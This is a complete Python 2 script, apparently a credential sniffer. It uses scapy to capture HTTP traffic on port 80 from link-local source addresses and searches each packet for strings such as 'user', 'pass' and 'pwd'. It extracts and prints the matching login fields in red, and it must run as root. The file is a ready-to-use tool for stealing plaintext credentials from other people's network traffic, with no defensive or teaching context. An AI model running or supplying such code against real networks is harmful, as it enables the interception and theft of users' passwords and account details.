#!/usr/bin/env python

import os
import sys
import logging
# disable scapy ipv6 warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import * # pip install scapy

local_ip = "169.254.1."
keywords = ["user", "pass", "account", "pwd", "log"]

def http_handler(packet):
    data = str(packet)

    if IP in packet:
        if local_ip in str(packet[IP].src): # send
            print packet.summary()
            for keyword in keywords:
                if keyword in data.lower():

                    out = data[data.find(keyword):].split("\n")[0].split("&")[0].split(" ")[0]
                    print "\033[1;31m" + out + "\033[1;m"

if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

    if len(sys.argv) != 2:
        exit("Usage: %s <interface>" % sys.argv[0])

    interface = sys.argv[1]
    sniff(iface=interface, filter="tcp and port 80", prn=http_handler, store=0)
